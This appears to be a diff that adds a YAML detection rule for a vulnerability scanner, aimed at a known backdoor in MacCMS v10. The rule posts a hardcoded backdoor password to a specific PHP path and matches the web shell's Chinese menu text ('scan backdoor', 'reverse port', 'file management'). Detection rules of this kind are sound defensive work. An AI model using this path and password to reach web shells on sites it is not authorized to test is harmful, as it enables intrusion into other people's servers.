@@ -1,0 +1,15 @@
+name: poc-yaml-maccmsv10-backdoor
+rules:
+  - method: POST
+    path: /extend/Qcloud/Sms/Sms.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: getpwd=WorldFilledWithLove
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"扫描后门") && response.body.bcontains(b"反弹端口") && response.body.bcontains(b"文件管理")
+detail:
+  author: FiveAourThe(https://github.com/FiveAourThe)
+  links:
+    - https://www.cnblogs.com/jinqi520/p/11596500.html
+    - https://www.t00ls.net/thread-53291-1-1.html
